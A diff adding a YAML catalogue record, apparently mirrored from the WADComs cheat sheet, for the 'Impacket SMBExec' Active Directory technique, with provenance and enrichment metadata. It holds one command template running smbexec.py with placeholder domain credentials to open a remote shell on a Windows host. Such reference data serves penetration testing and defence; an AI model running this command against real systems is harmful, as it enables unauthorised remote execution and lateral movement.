@@ -1,0 +1,76 @@
+id: wadcoms/Impacket-SMBExec
+type: technique
+platform: active-directory
+name: Impacket SMBExec
+phases:
+- execution
+capabilities:
+- command-execution
+privilege_required: domain-user
+sources:
+- project: WADComs
+  upstream_url: https://wadcoms.github.io
+  license: GPL-3.0
+  upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+  last_synced: '2026-11-13'
+preconditions:
+- a valid password
+- a valid username
+commands:
+- template: python3 smbexec.py test.local/john:password123@10.10.10.1
+  comment: "Impacket's smbexec.py. This will give you an interactive shell on the Windows host.\n\nCommand\
+    \ Reference:\n\n\tTarget IP: 10.10.10.1\n\n\tDomain: test.local\n\n\tUsername: john\n\n\tPassword:\
+    \ password123\n"
+references:
+- https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py
+- https://www.varonis.com/blog/insider-danger-stealthy-password-hacking-with-smbexec/
+tags:
+- active-directory
+- wadcoms
+- smb
+source_data:
+  WADComs:
+    raw:
+      file: Impacket-SMBExec.md
+      document: "---\ndescription: |\n  Impacket's smbexec.py. This will give you an interactive shell\
+        \ on the Windows host.\n\n  Command Reference:\n\n  \tTarget IP: 10.10.10.1\n\n  \tDomain: test.local\n\
+        \n  \tUsername: john\n\n  \tPassword: password123\ncommand: |\n  python3 smbexec.py test.local/john:password123@10.10.10.1\n\
+        items:\n  - Password\n  - Username\nservices:\n  - SMB\nOS:\n  - Linux\n  - Windows\nattack_types:\n\
+        \  - Exploitation\nreferences:\n  - https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbexec.py\n\
+        \  - https://www.varonis.com/blog/insider-danger-stealthy-password-hacking-with-smbexec/\n---\n"
+    upstream_url: https://wadcoms.github.io
+    upstream_version: 0c4609d7dffa7c12a378863a360636c9f275b240
+    last_synced: '2026-11-13'
+enrichment:
+  capabilities:
+  - value: command-execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  phases:
+  - value: execution
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+      note: 'exact D2 mapping of upstream attack_types value: Exploitation'
+    confidence:
+      level: high
+  privilege_required:
+    value: domain-user
+    provenance:
+      type: adapter
+      source: WADComs
+      adapter: wadcoms@0c4609d7dffa7c12a378863a360636c9f275b240
+    confidence:
+      level: high
+_meta:
+  schema_version: 1
+  generated_by: loldex-projection
+  projected_at: '2026-11-13'
+  source_hashes:
+    WADComs: sha256:760bfcc360ff5e9848e4247d58fb8147d903c79b756a0974f7c4458633d2a09f
